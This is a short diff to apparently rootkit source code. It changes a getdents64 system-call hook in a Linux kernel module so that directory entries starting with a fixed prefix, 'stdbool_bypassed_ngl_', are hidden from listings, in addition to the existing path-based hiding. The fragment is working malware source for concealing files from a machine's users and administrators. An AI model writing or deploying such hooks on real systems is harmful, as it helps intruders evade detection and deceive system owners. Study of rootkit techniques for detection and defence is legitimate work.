@@ -60,15 +60,22 @@ asmlinkage int notrace getdents64_hook(const struct pt_regs *regs) {
     unsigned int new_size = ret;
     unsigned int new_off = 0;
 
+    const char prefix[] = "stdbool_bypassed_ngl_";
+    size_t prefix_len = strlen(prefix);
+
     // Loop through the entries in the buffer
     // Check if the entry is hidden or not
     while (offset < ret) {
         struct linux_dirent64 *d = (void *)(kbuf + offset);
         int reclen = d->d_reclen;
+        bool hide = false;
+
+        if (strncmp(d->d_name, prefix, prefix_len) == 0) {
+            hide = true;
+        }
 
         // Build full path to be more precise than before
-        bool hide = false;
-        if (dirstr) {
+        else if (dirstr) {
             char fullpath[512];
             int len;
 
